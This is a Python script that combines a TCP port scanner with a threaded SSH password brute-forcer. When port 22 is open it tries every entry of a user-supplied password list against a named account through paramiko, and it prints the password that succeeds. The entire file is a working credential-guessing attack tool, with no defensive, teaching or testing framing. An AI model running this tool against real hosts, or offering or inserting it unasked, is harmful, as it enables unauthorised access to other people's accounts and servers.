import socket
import sys
from IPy import IP
import os
import paramiko
import threading, time

open_port = []
threading_count = 0


def check_ip(ip):
    try:
        IP(ip)
        return ip
    except:
        try:
            return socket.gethostbyname(ip)
        except:
            print("Please Enter a Valid Ip Address")
            sys.exit(1)


def port_scanning():
    port_range_begin = int(input("Range of ports to scan \nScan From port: "))
    port_range_end = int(input("To Port: "))
    scan_ports(port_range_begin, port_range_end, confirmed_ip)
    if 22 in open_port:
        ans = input("Seems like Port 22 is open. Would you like to try SSH brute force: (y/n)")
        if ans.lower() == "y":
            ssh_brute_force_parameters()
        else:
            print("Exiting")
            sys.exit(1)


def scan_ports(range_start,  range_end, target_ip):
    range_end = range_end + 1
    range_ports = range(range_start, range_end)
    for port in range_ports:
        scanning(target_ip, port)


def scanning(target_ip, port_s):
    global open_port
    port_s = int(port_s)
    try:
        conn = socket.socket()
        conn.connect((target_ip, port_s))
        print("Port " + str(port_s) + " open.")
        open_port.append(port_s)
    except Exception as e:
        print("Could not connect to port " + str(port_s))
        pass
        #print(e)
#remove comment to print exception encountered


def ssh_brute_force_parameters():
    global target
    ssh_password_list = input("Enter path to passwords file: ")
    confirmed_ssh_password_list = confirm_ssh_password_list(ssh_password_list)
    target_ssh = input("Enter account username: ")
    try:
        with open(confirmed_ssh_password_list, 'r') as file:
            for every_line in file.readlines():
                if threading_count == 1:
                    thread_.join()
                    exit()
                password = every_line.strip()
                thread_ = threading.Thread(target=ssh_brute_force, args=(target, target_ssh, password,))
                thread_.start()
                time.sleep(0.5)
    except Exception as e:
        print(e)
        sys.exit(1)


def confirm_ssh_password_list(list_path):
    if not os.path.exists(list_path):
        print("Cannot find the path to password list")
        ssh_brute_force_parameters()
    else:
        try:
            file = open(list_path, 'r')
            return list_path
        except Exception as e:
            print("Error encountered. Please specify path again or confirm and try again.")
            #print(e)
            #remove comments to print exception encountered.
            ssh_brute_force_parameters()
    return list_path


def ssh_brute_force(target, account_username, password):
    global threading_count
    main_ssh = paramiko.SSHClient()
    main_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        main_ssh.connect(target, port=22, username=account_username, password=password)
        threading_count = 1
        print("Password found: " + str(password))
    except Exception as e:
        #print(e)
        #remove comments to print exception encountered.
        print("wrong password " + str(password))


target = str(sys.argv[1])
confirmed_ip = check_ip(target)
answer = input("SSH or Port Scanning(p). (s/p)? ")
if answer.lower() == "s":
    ssh_brute_force_parameters()
elif answer.lower() == "p":
    port_scanning()
else:
    print("Invalid Choice")
    sys.exit(1)




